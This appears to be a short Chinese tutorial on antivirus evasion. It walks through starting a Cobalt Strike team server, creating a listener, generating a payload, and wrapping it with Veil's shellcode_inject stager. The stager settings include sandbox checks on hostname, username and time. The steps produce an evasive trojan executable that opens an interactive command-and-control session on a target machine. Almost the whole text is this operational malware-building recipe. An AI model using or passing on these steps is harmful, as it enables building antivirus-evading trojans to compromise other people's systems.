免杀

使用veil和Cobalt Stirke 进行渗透

1.启动团队服务器Team Server

​ 进入Cobalt Stirke 文件夹 下 执行 ./teamserver {host}{possword}

​

2.启动cs

​ 执行 java -jar cobaltsrike.jar（possword与步骤1密码一致）

​

3.进入GUI界面

​

​

​ 点击cobalt strike 选择 Listeners模块 点击add 配置参数

4.生成免杀木马

​ 生成木马

​ 点击Attacks 选择Packages中Payload Generator 配置 参数 output选择veil 后 将生成一个txt文件

​ 打开veil root@kali2019:~# veil

​ 执行use 1后 执行list 可以看到有41个payload

​ 对于cs生成的payload(\x00..),需使用shellcode_inject类型的stager进行免杀

​ 使用第17个stage use 17

​ 配置参数

[go/shellcode_inject/virtual>>]: set Sleep 5
[go/shellcode_inject/virtual>>]: set HOSTNAME LGL 计算机名
[go/shellcode_inject/virtual>>]: set UTCcheck TRUE
[go/shellcode_inject/virtual>>]: set USERNAME LGL 用户名

[go/shellcode_inject/virtual>>]: generate 运行

​

在此选择3 输入cs生成的payload中的字符串

然后Veil提示
[>] Please enter the base name for output files (default is payload): 17yes （请输入生成文件的名称）

最后 生成了2个文件：

17yes.exe就是免杀后生成的程序

5.将程序丢入靶机 运行

cs 产生交互命令界面
